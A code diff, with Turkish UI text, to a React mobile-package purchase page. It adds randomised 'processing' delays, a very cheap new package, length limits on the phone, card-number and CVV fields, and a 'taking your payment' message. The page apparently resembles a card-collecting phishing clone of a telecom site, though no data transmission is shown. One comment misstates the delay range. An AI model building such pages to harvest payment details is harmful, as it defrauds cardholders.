@@ -11,9 +11,12 @@ const Index = () => {
 
   // handleContinue fonksiyonunu değiştirin
   const handleContinue = () => {
+    // Rastgele 3000 ile 6000 milisaniye (3 ile 6 saniye) arasında bir gecikme süresi belirleyin
+    const delay = Math.floor(Math.random() * (4000 - 2000 + 1) + 2000)
+
     setTimeout(() => {
       setStep(step + 1)
-    }, 2000) // 1000 milisaniye (2 saniye) bekle
+    }, delay)
   }
 
   const handlePhoneNumberChange = (e) => {
@@ -69,6 +72,14 @@ const Index = () => {
       price: '₺47',
       validity: '28 gün geçerli',
     },
+    {
+      name: 'Süper+Ekonomik',
+      data: '4 GB',
+      minutes: '500 DK',
+      sms: '250 SMS',
+      price: '₺30',
+      validity: '28 gün geçerli',
+    },
   ]
 
   return (
@@ -97,9 +108,10 @@ const Index = () => {
                 placeholder="Telefon Numarası"
                 value={phoneNumber}
                 onChange={handlePhoneNumberChange}
+                maxLength={12}
               />
               <button
-                className="bg-red-600 text-white font-semibold px-4 py-2 rounded"
+                className="bg-red-600 text-white font-semibold px-4 py-2 rounded hover:bg-red-700 mt-2"
                 onClick={handleContinue}
               >
                 Devam Et
@@ -248,6 +260,7 @@ const Index = () => {
                   placeholder="4321 1232 131"
                   value={cardNumber}
                   onChange={(e) => setCardNumber(e.target.value)}
+                  maxLength={16}
                 />
                 <div className="flex justify-between mb-4">
                   <input
@@ -263,6 +276,7 @@ const Index = () => {
                     placeholder="CVV"
                     value={cvc}
                     onChange={(e) => setCvc(e.target.value)}
+                    maxLength={3}
                   />
                 </div>
                 <hr className="mb-4" />
@@ -285,6 +299,11 @@ const Index = () => {
                 >
                   Paketi Satın Al
                 </button>
+                {step === 4 && (
+                  <p className="font-medium underline text-red-600 text-center text-[15px] mt-6 mb-6">
+                    Bekleyin Ödemenizi Alıyoruz...{' '}
+                  </p>
+                )}
               </div>
             )}
           </div>
